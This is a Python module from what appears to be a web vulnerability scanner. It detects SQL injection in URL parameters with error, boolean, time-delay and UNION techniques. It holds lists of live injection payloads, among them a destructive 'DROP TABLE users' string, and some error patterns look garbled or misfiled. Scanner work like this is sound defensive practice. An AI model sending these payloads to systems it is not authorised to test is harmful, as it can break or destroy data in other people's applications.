"""
asmon/modules/sqli_detection.py — SQL Injection detection module.

Detection techniques:
  - Error-based: Database error message fingerprinting
  - Boolean-based: Response comparison for true/false conditions
  - Time-based: Response time differences with SLEEP/WAITFOR
  - UNION-based: Column enumeration and data extraction indicators

Uses signal-based detection with minimal, targeted payloads.
"""

import logging
import re
import time
import hashlib
from typing import Optional, Tuple, List
from urllib.parse import urlparse, parse_qs

from asmon.modules.base import (
    BaseModule,
    ModuleRegistry,
    Finding,
    FindingSeverity,
    FindingConfidence,
    FindingType,
    ProbeResult,
)
from asmon.modules.http_utils import SecurityHTTPClient, inject_payload, get_params_from_url

logger = logging.getLogger("asmon.modules.sqli")


# ---------------------------------------------------------------------------
# SQL Error patterns by database
# ---------------------------------------------------------------------------

SQL_ERROR_PATTERNS = {
    "mysql": [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL server version",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"Unclosed quotation mark after the character string",
        r"org\.gjt\.mm\.mysql",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
    ],
    "mssql": [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"Warning.*mssql_",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.SqlException",
        r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"(?s)Exception.*\WRoadhouse\.Cms\.",
        r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
        r"\[SQL Server\]",
        r"ODBC SQL Server Driver",
        r"ODBC Driver \d+ for SQL Server",
        r"SQLServer JDBC Driver",
        r"macaborni=telecom\.telecom",
        r"com\.jnetdirect\.jsql",
        r"Msg \d+, Level \d+, State \d+",
        r"Unclosed quotation mark after the character string",
    ],
    "oracle": [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
        r"oracle\.jdbc\.driver",
        r"quoted string not properly terminated",
    ],
    "sqlite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
        r"SQLITE_MISUSE",
        r"unrecognized token:",
    ],
    "generic": [
        r"SQL syntax",
        r"SQL error",
        r"syntax error",
        r"mysql_fetch",
        r"SQLSTATE",
        r"Database error",
        r"Query failed",
        r"DB Error",
        r"unexpected end of SQL command",
    ],
}


# ---------------------------------------------------------------------------
# SQL Injection payloads
# ---------------------------------------------------------------------------

# Error-based payloads - trigger syntax errors
ERROR_PAYLOADS = [
    "'",                           # Single quote
    "\"",                          # Double quote
    "'--",                         # Comment
    "\"--",
    "1'",
    "1\"",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR ''='",
    "\" OR \"\"=\"",
    "1' AND '1'='2",
    "') OR ('1'='1",
    "\") OR (\"1\"=\"1",
    "1 OR 1=1",
    "1' OR 1=1--",
    "1' OR 1=1#",
    "1' OR 1=1/*",
    "admin'--",
    "1'; DROP TABLE users--",      # Classic SQLi (will error on most DBs)
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
]

# Boolean-based payloads - pairs that should produce different results
BOOLEAN_PAYLOADS = [
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1' AND 1=1#", "1' AND 1=2#"),
    ("1') AND ('1'='1", "1') AND ('1'='2"),
    ("1\") AND (\"1\"=\"1", "1\") AND (\"1\"=\"2"),
]

# Time-based payloads - should cause delay
TIME_PAYLOADS = [
    # MySQL
    ("1' AND SLEEP(5)--", 5),
    ("1' AND SLEEP(5)#", 5),
    ("1\" AND SLEEP(5)--", 5),
    ("1'; WAITFOR DELAY '0:0:5'--", 5),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),

    # PostgreSQL
    ("1'; SELECT pg_sleep(5)--", 5),
    ("1' AND (SELECT pg_sleep(5))::text=''--", 5),

    # MSSQL
    ("1'; WAITFOR DELAY '0:0:5'--", 5),
    ("1' WAITFOR DELAY '0:0:5'--", 5),

    # Oracle
    ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", 5),

    # SQLite
    ("1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND LIKE('SLEEP%',name))--", 3),
]

# UNION-based payloads for column enumeration
UNION_PAYLOADS = [
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "1' UNION ALL SELECT NULL--",
    "1' UNION ALL SELECT NULL,NULL--",
    "1' UNION ALL SELECT NULL,NULL,NULL--",
    "1\" UNION SELECT NULL--",
    "1\" UNION SELECT NULL,NULL--",
]


@ModuleRegistry.register
class SQLiDetectionModule(BaseModule):
    """Detects SQL Injection vulnerabilities."""

    name = "sqli_detection"
    description = "Detects SQL injection via error, boolean, time, and UNION-based techniques"
    risk_level = "high"
    requires_authorization = True

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.http = SecurityHTTPClient(
            timeout=self.timeout,
            rate_limit=self.rate_limit,
            user_agent=self.user_agent,
        )
        self.time_threshold = 4.0  # Seconds to consider a delay
        self.enable_error_based = True
        self.enable_boolean_based = True
        self.enable_time_based = True
        self.enable_union_based = True

    def run(self, target: dict) -> list[Finding]:
        """
        Test URL parameters for SQL injection.

        Args:
            target: Dict with 'url' containing parameters to test
        """
        self.findings = []

        url = target.get("url")
        if not url:
            return self.findings

        # Extract parameters to test
        params = get_params_from_url(url)
        if not params:
            self.logger.debug("No parameters to test in URL: %s", url)
            return self.findings

        self.logger.info("Testing %d parameters for SQLi: %s", len(params), url)

        # Get baseline response
        baseline = self.http.get(url)
        if not baseline.success:
            self.logger.debug("Could not get baseline response for %s", url)
            return self.findings

        # Test each parameter
        for param in params.keys():
            self._test_parameter(url, param, baseline)

        return self.findings

    def _test_parameter(self, url: str, param: str, baseline: ProbeResult):
        """Test a single parameter for SQLi."""
        self.logger.debug("Testing parameter '%s' for SQLi", param)

        # Error-based detection
        if self.enable_error_based:
            finding = self._test_error_based(url, param)
            if finding:
                self.add_finding(finding)
                return  # Found confirmed SQLi, no need to continue

        # Boolean-based detection
        if self.enable_boolean_based:
            finding = self._test_boolean_based(url, param, baseline)
            if finding:
                self.add_finding(finding)
                return

        # Time-based detection
        if self.enable_time_based:
            finding = self._test_time_based(url, param)
            if finding:
                self.add_finding(finding)
                return

        # UNION-based detection
        if self.enable_union_based:
            finding = self._test_union_based(url, param)
            if finding:
                self.add_finding(finding)

    def _test_error_based(self, url: str, param: str) -> Optional[Finding]:
        """Test for error-based SQL injection."""
        for payload in ERROR_PAYLOADS:
            test_url = inject_payload(url, param, payload)

            result = self.http.get(test_url)
            if not result.success or not result.response:
                continue

            body = result.response.body_preview

            # Check for SQL error patterns
            db_type, matched_pattern = self._detect_sql_error(body)

            if db_type:
                return Finding(
                    finding_id=self.generate_finding_id("sqli_error", url, param, payload),
                    finding_type=FindingType.SQLI_ERROR.value,
                    module=self.name,
                    severity=FindingSeverity.CRITICAL.value,
                    confidence=FindingConfidence.HIGH.value,
                    host=self._extract_host(url),
                    url=url,
                    parameter=param,
                    title=f"SQL Injection (Error-based) in parameter '{param}'",
                    description=f"The parameter '{param}' is vulnerable to SQL injection. "
                               f"Database type detected: {db_type}",
                    evidence={
                        "payload": payload,
                        "parameter": param,
                        "database_type": db_type,
                        "error_pattern": matched_pattern,
                        "request_url": test_url,
                        "response_code": result.response.status_code,
                    },
                    remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
                    cwe_ids=["CWE-89"],
                    references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                )

        return None

    def _test_boolean_based(self, url: str, param: str, baseline: ProbeResult) -> Optional[Finding]:
        """Test for boolean-based blind SQL injection."""
        baseline_hash = self._response_hash(baseline)

        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            # Test true condition
            true_url = inject_payload(url, param, true_payload)
            true_result = self.http.get(true_url)

            if not true_result.success or not true_result.response:
                continue

            # Test false condition
            false_url = inject_payload(url, param, false_payload)
            false_result = self.http.get(false_url)

            if not false_result.success or not false_result.response:
                continue

            true_hash = self._response_hash(true_result)
            false_hash = self._response_hash(false_result)

            # Check if true condition matches baseline but false doesn't
            if true_hash == baseline_hash and false_hash != baseline_hash:
                return Finding(
                    finding_id=self.generate_finding_id("sqli_boolean", url, param),
                    finding_type=FindingType.SQLI_BOOLEAN.value,
                    module=self.name,
                    severity=FindingSeverity.HIGH.value,
                    confidence=FindingConfidence.MEDIUM.value,
                    host=self._extract_host(url),
                    url=url,
                    parameter=param,
                    title=f"SQL Injection (Boolean-based) in parameter '{param}'",
                    description=f"The parameter '{param}' appears vulnerable to boolean-based blind SQL injection. "
                               "Different responses were observed for TRUE and FALSE conditions.",
                    evidence={
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "parameter": param,
                        "true_response_length": len(true_result.response.body_preview),
                        "false_response_length": len(false_result.response.body_preview),
                    },
                    remediation="Use parameterized queries/prepared statements.",
                    cwe_ids=["CWE-89"],
                )

            # Also check if responses differ significantly
            if true_hash != false_hash:
                true_len = len(true_result.response.body_preview)
                false_len = len(false_result.response.body_preview)

                # Significant length difference
                if abs(true_len - false_len) > 100:
                    return Finding(
                        finding_id=self.generate_finding_id("sqli_boolean", url, param),
                        finding_type=FindingType.SQLI_BOOLEAN.value,
                        module=self.name,
                        severity=FindingSeverity.HIGH.value,
                        confidence=FindingConfidence.LOW.value,
                        host=self._extract_host(url),
                        url=url,
                        parameter=param,
                        title=f"Potential SQL Injection (Boolean-based) in parameter '{param}'",
                        description=f"The parameter '{param}' shows different response lengths for "
                                   "TRUE/FALSE SQL conditions. Manual verification recommended.",
                        evidence={
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "true_length": true_len,
                            "false_length": false_len,
                        },
                        remediation="Use parameterized queries/prepared statements.",
                        cwe_ids=["CWE-89"],
                        false_positive_likelihood="medium",
                    )

        return None

    def _test_time_based(self, url: str, param: str) -> Optional[Finding]:
        """Test for time-based blind SQL injection."""
        # First, establish baseline response time
        baseline_times = []
        for _ in range(3):
            start = time.time()
            result = self.http.get(url)
            elapsed = time.time() - start
            if result.success:
                baseline_times.append(elapsed)

        if not baseline_times:
            return None

        avg_baseline = sum(baseline_times) / len(baseline_times)

        for payload, expected_delay in TIME_PAYLOADS:
            test_url = inject_payload(url, param, payload)

            start = time.time()
            result = self.http.get(test_url)
            elapsed = time.time() - start

            if not result.success:
                continue

            # Check if response was delayed
            if elapsed > (avg_baseline + self.time_threshold):
                # Verify with a second test
                start2 = time.time()
                result2 = self.http.get(test_url)
                elapsed2 = time.time() - start2

                if elapsed2 > (avg_baseline + self.time_threshold):
                    return Finding(
                        finding_id=self.generate_finding_id("sqli_time", url, param),
                        finding_type=FindingType.SQLI_TIME.value,
                        module=self.name,
                        severity=FindingSeverity.CRITICAL.value,
                        confidence=FindingConfidence.HIGH.value,
                        host=self._extract_host(url),
                        url=url,
                        parameter=param,
                        title=f"SQL Injection (Time-based) in parameter '{param}'",
                        description=f"The parameter '{param}' is vulnerable to time-based blind SQL injection. "
                                   f"SLEEP/WAITFOR payload caused {elapsed:.2f}s delay (baseline: {avg_baseline:.2f}s).",
                        evidence={
                            "payload": payload,
                            "parameter": param,
                            "baseline_time": round(avg_baseline, 2),
                            "delayed_time": round(elapsed, 2),
                            "expected_delay": expected_delay,
                        },
                        remediation="Use parameterized queries/prepared statements.",
                        cwe_ids=["CWE-89"],
                    )

        return None

    def _test_union_based(self, url: str, param: str) -> Optional[Finding]:
        """Test for UNION-based SQL injection."""
        for payload in UNION_PAYLOADS:
            test_url = inject_payload(url, param, payload)

            result = self.http.get(test_url)
            if not result.success or not result.response:
                continue

            body = result.response.body_preview

            # Check for successful UNION (no error, similar response)
            db_type, _ = self._detect_sql_error(body)

            if not db_type:
                # No error with UNION - might be working
                # Check for column mismatch errors which indicate vulnerability
                column_errors = [
                    r"different number of columns",
                    r"columns don't match",
                    r"UNION member has",
                    r"select list has too",
                    r"SELECTs to the left and right of UNION",
                ]

                for pattern in column_errors:
                    if re.search(pattern, body, re.IGNORECASE):
                        return Finding(
                            finding_id=self.generate_finding_id("sqli_union", url, param),
                            finding_type=FindingType.SQLI_UNION.value,
                            module=self.name,
                            severity=FindingSeverity.CRITICAL.value,
                            confidence=FindingConfidence.HIGH.value,
                            host=self._extract_host(url),
                            url=url,
                            parameter=param,
                            title=f"SQL Injection (UNION-based) in parameter '{param}'",
                            description=f"The parameter '{param}' is vulnerable to UNION-based SQL injection. "
                                       "Column count enumeration is possible.",
                            evidence={
                                "payload": payload,
                                "parameter": param,
                                "error_pattern": pattern,
                            },
                            remediation="Use parameterized queries/prepared statements.",
                            cwe_ids=["CWE-89"],
                        )

        return None

    def _detect_sql_error(self, body: str) -> Tuple[Optional[str], Optional[str]]:
        """Detect SQL error in response body."""
        for db_type, patterns in SQL_ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    return db_type, pattern

        return None, None

    def _response_hash(self, result: ProbeResult) -> str:
        """Generate hash of response for comparison."""
        if not result.success or not result.response:
            return ""

        # Hash based on status code and body content
        content = f"{result.response.status_code}:{result.response.body_preview}"
        return hashlib.md5(content.encode()).hexdigest()

    def _extract_host(self, url: str) -> str:
        """Extract host from URL."""
        return urlparse(url).netloc.split(":")[0]
